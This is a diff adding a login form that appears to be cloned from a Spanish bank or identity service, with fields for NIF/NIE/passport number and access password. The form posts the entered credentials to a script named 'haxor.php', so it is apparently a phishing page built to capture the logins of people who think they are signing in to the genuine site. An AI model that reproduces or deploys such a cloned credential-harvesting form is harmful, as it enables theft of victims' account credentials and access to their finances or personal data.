@@ -1,0 +1,27 @@
+<form name="signIn" method="post" novalidate action="haxor.php" class="auth-validate-form auth-real-time-validation a-spacing-none">
+    <fieldset>
+      <legend>
+        <div ng-class="{&#39;has-error&#39;: formLogin.identificador.$dirty &amp;&amp; (formLogin.identificador.$error.required || formLogin.identificador.$error.pattern)}" class="has-feedback">
+          <!-- ngIf: !loginApp.loginContrato --><label ng-if="!loginApp.loginContrato" class="padding-bottom-sm oip-box">
+            <input id="user" ng-model="loginApp.document" required="" check-id="" autofocus="" type="text" ng-pattern="/^[a-zA-Z0-9]+$/" maxlength="20" name="identificador" placeholder="NIF / NIE / PASAPORTE" ng-class="{&#39;rwd-btn&#39;:loginApp.isMobile}" ng-change="loginApp.refresSize(loginApp.document)" class="ng-pristine ng-untouched ng-invalid ng-invalid-required ng-valid-pattern ng-valid-maxlength" aria-required="true" aria-invalid="true"><span ng-class="{&#39;floating-error&#39;: formLogin.identificador.$dirty &amp;&amp; (formLogin.identificador.$error.required || formLogin.identificador.$error.pattern), &#39;rwd-floating-label&#39;:loginApp.isMobile}" class="floating-label">Usuario</span><span ng-show="formLogin.identificador.$dirty &amp;&amp; formLogin.identificador.$error.required" class="error ng-hide" aria-hidden="true">Identificador obligatorio</span><span ng-show="formLogin.identificador.$error.check &amp;&amp; !formLogin.identificador.$error.required" class="error ng-hide" aria-hidden="true">Identificador erróneo</span><span ng-show="formLogin.identificador.$dirty &amp;&amp; formLogin.identificador.$error.pattern" class="error ng-hide" aria-hidden="true">Introduce tu documento completo (letras y números) evitando espacios y guiones.</span>
+          </label><!-- end ngIf: !loginApp.loginContrato -->
+        </div>
+        <!-- ngIf: loginApp.loginContrato -->
+      </legend>
+      <div ng-class="{&#39;has-error&#39;: formLogin.password.$dirty &amp;&amp; formLogin.password.$error.required}" class="has-feedback">
+        <label class="padding-bottom-sm oip-box">
+          <input id="password" ng-model="loginApp.password" required="" type="password" name="password" maxlength="20" placeholder=" " ng-class="{&#39;rwd-btn&#39;:loginApp.isMobile}" ng-change="loginApp.refresSize(loginApp.password)" class="ng-pristine ng-untouched ng-invalid ng-invalid-required ng-valid-maxlength" aria-required="true" aria-invalid="true"><span ng-class="{&#39;floating-error&#39;: formLogin.password.$dirty &amp;&amp; formLogin.password.$error.required, &#39;rwd-floating-label&#39;:loginApp.isMobile}" class="floating-label">Clave de acceso</span><span ng-show="formLogin.password.$dirty &amp;&amp; formLogin.password.$error.required" class="error ng-hide" aria-hidden="true">Clave obligatoria</span>
+          <!--span.help-block.error(ng-show="loginApp.loginContrato && loginApp.reintentoLoginContrato && !formLogin.password.$invalid")| La clave es incorrecta
+          -->
+          <!--span.error(ng-show="loginApp.serviceConflict")| La clave es incorrecta
+          -->
+        </label>
+      </div>
+      <div class="mod_buttons oip-box padding-bottom-sm">
+        <button type="submit" title="Entrar" value="Entrar" ng-disabled="loginApp.validando || loginApp.accediendo || disabledNie" ng-class="{&#39;rwd-btn&#39;:loginApp.isMobile}" class="but-green" aria-disabled="false"><!-- ngIf: !loginApp.validando && !loginApp.accediendo --><span ng-if="!loginApp.validando &amp;&amp; !loginApp.accediendo" ng-class="{&#39;oip-disabled-login&#39;: disabledNie === true}" class="ladda-label">Entrar</span><!-- end ngIf: !loginApp.validando && !loginApp.accediendo -->
+          <!-- ngIf: loginApp.validando -->
+          <!-- ngIf: loginApp.accediendo -->
+        </button>
+      </div>
+    </fieldset>
+  </form>
